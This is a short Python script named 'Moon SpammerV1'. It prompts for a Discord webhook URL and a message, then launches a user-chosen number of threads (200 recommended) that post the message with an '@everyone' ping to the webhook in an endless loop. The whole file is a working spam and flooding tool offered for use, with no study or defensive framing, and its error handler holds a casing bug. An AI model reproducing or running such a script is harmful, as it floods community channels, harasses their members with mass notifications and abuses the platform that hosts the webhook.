import time
import requests
import pyfiglet
import threading
import os
from colorama import Fore, Style
from datetime import datetime



os.system(f'cls & mode 85,20 & title Moon SpammerV1')


black = "\033[1;30m"
red = "\033[1;31m"    
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"    
purple = "\033[1;35m"    
cyan = "\033[1;36m"    
white = "\033[1;37m"  
dark_purple = "\033[0;35m"



print(pyfiglet.figlet_format("MoonSpammerV1"))

msg = input(f"{green}[Config]{Style.RESET_ALL} Please Insert WebHook Spam Message: ")
webhook_url = input(f"{green}[Config]{Style.RESET_ALL} Please Insert WebHook URL: ")
th = int(input(f'{green}[Config]{Style.RESET_ALL} Number of threads? (200 recommended): '))
sleep = int(input(f"{green}[Config]{Style.RESET_ALL} Sleeping time? (recommended 2): "))

def spam():
    while True:
        try:
            data = requests.post(webhook_url, json={'content': f"@everyone {msg}"})
            if data.status_code == 204:
                print(f"{dark_purple}[+]{Style.RESET_ALL} {green}Sent {msg}{Style.RESET_ALL}")
        except:
            print(f"{purple}[+]{style.RESET_ALL} {red}Error sending message: {msg} {Style.RESET_ALL}")
        time.sleep(sleep)

for x in range(th):
    t = threading.Thread(target=spam)
    t.start()
